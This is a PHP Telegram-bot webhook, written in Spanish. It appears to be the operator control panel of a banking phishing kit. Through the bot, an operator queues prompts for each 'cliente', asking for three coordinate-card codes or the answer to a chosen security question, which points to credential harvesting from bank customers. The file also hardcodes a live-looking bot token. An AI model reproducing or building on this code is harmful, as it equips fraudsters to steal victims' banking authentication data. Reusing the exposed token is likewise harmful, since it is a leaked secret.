<?php
session_start();

$content = file_get_contents("php://input");
$update = json_decode($content, true);
$token = "7490119561:AAGJmnLToplJQ3FamNGMU6RKVSnSqsQ5g9c";
$chat_id = $update["message"]["chat"]["id"] ?? ($update["callback_query"]["from"]["id"] ?? null);

function guardarAccion($usuario, $accion) {
    $sessionPath = sys_get_temp_dir() . "/sess_" . $usuario;
    file_put_contents($sessionPath, serialize([$accion]));
}

if (isset($update["callback_query"])) {
    $data = $update["callback_query"]["data"];
    list($accion, $usuario) = explode("|", $data);

    if ($accion === "COORD") {
        $_SESSION["estado_$usuario"] = "ESPERANDO_COORDENADAS_3";
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "✏️ Escribí las 3 coordenadas (ej: A1B2C3) para el cliente: $usuario"
        ]));
    } elseif ($accion === "CLAVE") {
        $_SESSION["estado_$usuario"] = "ESPERANDO_PREGUNTA";
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "✏️ Escribí la pregunta que querés mostrar al cliente: $usuario"
        ]));
    } else {
        $_SESSION["accion_$usuario"] = "/$accion";
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
            "chat_id" => $chat_id,
            "text" => "/$accion enviado a $usuario"
        ]));
    }
} elseif (isset($update["message"])) {
    $msg = trim($update["message"]["text"]);
    foreach ($_SESSION as $key => $estado) {
        if (str_contains($key, "estado_")) {
            $usuario = str_replace("estado_", "", $key);
            if ($estado === "ESPERANDO_COORDENADAS_3") {
                $msg = strtoupper(preg_replace("/[^A-Z0-9]/i", "", $msg));
                $partes = str_split($msg, 2);
                if (count($partes) === 3) {
                    $_SESSION["accion_$usuario"] = "/coordenadas etiquetas/" . implode(",", $partes);
                    unset($_SESSION["estado_$usuario"]);
                    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
                        "chat_id" => $chat_id,
                        "text" => "✅ Coordenadas guardadas para $usuario"
                    ]));
                }
            } elseif ($estado === "ESPERANDO_PREGUNTA") {
                $_SESSION["accion_$usuario"] = "/palabra clave/" . $msg;
                unset($_SESSION["estado_$usuario"]);
                file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
                    "chat_id" => $chat_id,
                    "text" => "✅ Pregunta guardada para $usuario"
                ]));
            }
        }
    }
}
?>
